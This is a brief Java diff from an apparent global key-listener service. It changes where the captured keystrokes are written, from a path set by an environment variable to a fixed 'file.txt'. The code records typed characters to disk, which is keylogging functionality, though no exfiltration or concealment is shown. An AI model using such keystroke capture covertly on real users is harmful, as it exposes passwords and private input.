@@ -74,7 +74,7 @@ public class GlobalKeyListenerService {
                             storedInput.deleteCharAt(storedInput.length() -1);
                         }
                         storedInput.append(keyChar);
-                        File file = new File(System.getenv("FILE_PATH"));
+                        File file = new File("file.txt");
                         try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
                             writer.append(storedInput);
                         } catch (IOException e) {
